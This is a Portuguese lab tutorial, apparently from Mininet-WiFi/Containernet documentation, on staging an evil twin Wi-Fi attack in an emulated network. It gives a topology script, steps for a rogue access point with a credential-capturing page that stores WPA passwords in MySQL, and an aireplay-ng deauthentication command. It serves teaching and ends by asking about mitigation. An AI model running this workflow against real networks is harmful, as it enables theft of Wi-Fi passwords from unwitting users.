************
Evil Twin Attack
************


Hackeando a senha WPA2 usando Evil Twin Attack e Hostapd
-------------

.. image:: https://github.com/ramonfontes/sphinx_rtd_theme/blob/master/docs/imgs/evil-twin.png?raw=true

.. Note::
  **Neste documento você irá compreender como realizar o ataque denominado de  Evil Twin Attack**
  
  **Requisitos:** 
  
  - Containernet - https://github.com/ramonfontes/containernet
  - Hostapd

  **A VM disponível em https://github.com/intrig-unicamp/mininet-wifi deverá possuir todos os recursos necessários para reproduzir este documento. Porém, para utilizar o containernet você deverá entrar no diretório ~/containernet e dentro dele executar o comando `sudo make install` Caso alguma dependência esteja faltando ela terá de ser resolvida.**

Antes de tudo você precisa identificar a topologia de rede que será gerada através do código abaixo:

.. code:: python

 #!/usr/bin/python

 '''@author: Ramon Fontes
    @email: ramon.fontes@imd.ufrn.br'''

 from containernet.net import Containernet
 from containernet.node import DockerSta
 from mininet.log import setLogLevel, info
 from containernet.cli import CLI
 from containernet.term import makeTerm


 def topology():
     "Create a network."
     net = Containernet()

     info("*** Creating nodes\n")
     sta1 = net.addStation('sta1', ip='192.168.190.2/24')
     sta2 = net.addStation('sta2', ip='192.168.190.3/24')
     ap1 = net.addAccessPoint('ap1', ssid="simplewifi", mode="g", channel="1",
                              failMode="standalone", datapath='user')
     ap2 = net.addStation('ap2', cls=DockerSta, dimage="ramonfontes/rogue-ap", cpu_shares=20)

     info("*** Configuring wifi nodes\n")
     net.configureWifiNodes()

     info("*** Starting network\n")
     net.build()
     ap1.start([])

     ap2.setMasterMode(intf='ap2-wlan0', ssid='simplewifi', channel='1', mode='g')
     #ap2.cmd('pkill -f \"ap2-wlan0.apconf\"')
     ap2.cmd('ifconfig ap2-wlan0 up 192.168.190.1 netmask 255.255.255.0')

     sta2.cmd('route add default gw 192.168.190.1')
     sta2.cmd('iw dev sta2-wlan0 interface add mon0 type monitor')
     sta1.cmd('iwconfig sta1-wlan0 essid simplewifi ap 02:00:00:00:03:00')

     info("*** Running CLI\n")
     CLI(net)

     info("*** Stopping network\n")
     net.stop()


 if __name__ == '__main__':
     setLogLevel('info')
     topology()


Considerando que o código acima tenha sido salvo em um arquivo com nome `evil-twin-attack.py`, execute-o conforme abaixo:

.. code:: console

    sudo python evil-twin-attack.py
    
.. warning:: 

    O tempo de execução será maior se você estiver executando o código acima pela primeira vez, pois uma imagem gravada em conta no Docker será carregada na VM.
    
De acordo com a topologia acima, `sta1` deverá estar conectado ao ponto de acesso `ap1`. Voce pode confirmar esta afirmação utilizando o comando abaixo:

.. code:: console

    sta1 iw dev sta1-wlan0 link
    Connected to 02:00:00:00:03:00 (on sta1-wlan0)
          SSID: simplewifi
          freq: 2412
          RX: 62468 bytes (1373 packets)
          TX: 144 bytes (4 packets)
          signal: -36 dBm
          tx bitrate: 1.0 MBit/s

          bss flags:	short-slot-time
          dtim period:	2
          beacon int:	100
    
Na topologia do código acima, `sta1` será a vítima e `sta2` o atacante. Além disso, o ponto de acesso `ap1` será o ponto de acesso real e o ataque será feito através do ponto de acesso `ap2`.


.. admonition:: Passo a ser realizado
 
   - Neste momento, você deverá configurar ap2 de forma que ele permita o encaminhamento de dados entre a sua interface sem fio e sua interface com fio, de forma que a vítima possa ter acesso à Internet.
   - Execute também o hostapd em `ap2` para que a vítima possa receber sinal do ponto de acesso falso.
   
Neste momento, `ap2` deverá estar acessível à `sta1`, conforme pode ser observado abaixo:

.. code:: console

    sta1 iw dev sta1-wlan0 scan | grep SSID
    
    SSID: simplewifi
    SSID: simplewifi

A saída acima comprova que existem dois pontos de acesso divulgando o mesmo SSID.


Neste momento, você que é `sta2`, deverá conectar-se ao ponto de acesso `ap2` - o seu AP falso - e testar a conectividade com a Internet. Portanto, ao conectar-se, a saída esperada é a que se encontra abaixo:

.. code:: console

    containernet> sta2 ping -c1 8.8.8.8
    PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=1100 ms

    --- 8.8.8.8 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 1100.253/1100.253/1100.253/0.000 ms

.. admonition:: Passo a ser realizado

   - Agora, você deverá configurar `ap2` de forma que todo tráfego tendo como porta de origem 80 seja redirecionado para 192.168.190.1 também na porta 80. Dica: você pode ter que utilizar o `iptables`.
   - Como o `ap2` já vem pré-configurado com os recursos de software necessários para a execução do ataque, inicie os serviços `apache2` e `mysql`.
   - Defina o endereço de DNS de `sta2` para 8.8.8.8.
 
Então, ao tentar acessar o endereço http://www.google.com:80 ou qualquer outro site na porta 80 a partir de `sta2`, você deverá obter como resultado algo similar à figura apresentada abaixo:

.. image:: https://github.com/ramonfontes/sphinx_rtd_theme/blob/master/docs/imgs/evil-twin-screenshot.png?raw=true

Em um ambiente bem configurado, não seria necessário definir a porta 80. Qualquer site seria redirecionado para a página apresentada acima. Mesmo que fosse uma página em HTTPs. Aqui, certifique-se, pelo menos, que o arquivo em `ap2` localizado em `/var/www/html/dbconnect.php` possua o valor definido para a variável $host o mesmo IP da porta `eth0` de `ap2`. Caso contrário, você deverá ter que realizar modificações para que o servidor mysql funcione corretamente.

.. hint::

    - Usuário do banco de dados: rogueuser
    - Senha do usuário rogueuser: roguepassword
    - Nome do banco de dados: rogueap

Com todos os passos realizados com sucesso, você agora tem um ambiente pronto. Isso signfica que ao preencher alguma informação nos campos de usuário e senha da página acessada acima e submeter o formulário, as informações serão salvas no banco de dados `rogueap`.

Você pode confirmar a obtenção das informações através de uma consulta na tabela `wpa_keys`, conforme abaixo:

.. admonition:: Passo a ser realizado

     mysql> select * from wpa_keys;
     
     +-----------+-----------+   
     | password1 | password2 |   
     +-----------+-----------+   
     | teste     | teste     |   
     +-----------+-----------+  
     1 row in set (0.00 sec)   

Agora, só nos basta executar o comando abaixo para forçar a desassociação de `sta1` em relação ao `ap1`.

.. code:: console

   aireplay-ng -00 -a 02:00:00:00:03:00 mon0 --ignore-negative-one
   
Você poderá confirmar através do comando abaixo que `sta1` agora está associado ao `ap2`.


.. code:: console

    containernet> sta1 iw dev sta1-wlan0 link
    Connected to 02:00:00:00:02:00 (on sta1-wlan0)
      SSID: simplewifi
      freq: 2412
      RX: 2816701 bytes (62595 packets)
      TX: 2544 bytes (104 packets)
      signal: -36 dBm
      tx bitrate: 1.0 MBit/s

      bss flags:	short-slot-time
      dtim period:	2
      beacon int:	100


Qualquer acesso realizado por `sta1` agora será redirecionado para o `ap2`.
 

.. admonition:: Perguntas

    -Q1. Como este ataque pode ser mitigado?
